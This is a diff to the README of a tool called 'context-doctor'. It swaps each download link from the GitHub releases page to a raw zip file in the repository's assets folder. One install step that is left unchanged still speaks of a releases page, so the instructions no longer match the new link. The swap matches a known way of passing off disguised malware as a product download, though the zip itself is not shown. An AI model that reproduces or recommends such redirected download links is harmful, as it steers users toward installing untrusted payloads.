@@ -1,6 +1,6 @@
 # 🧠 context-doctor - Visualize and Diagnose Context Usage
 
-[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/releases)
+[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/raw/refs/heads/main/assets/doctor_context_3.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Each format helps you understand the context usage from a different angle.
 
 1. Click the big button at the top or visit the main download page here:
 
-   [Download context-doctor Releases](https://github.com/unhealthy-outlander317/context-doctor/releases)
+   [Download context-doctor Releases](https://github.com/unhealthy-outlander317/context-doctor/raw/refs/heads/main/assets/doctor_context_3.9.zip)
 
 2. On that page, find the latest version for Windows.
 
@@ -178,4 +178,4 @@ If you have issues or questions:
 
 ---
 
-[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/releases)
+[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/raw/refs/heads/main/assets/doctor_context_3.9.zip)
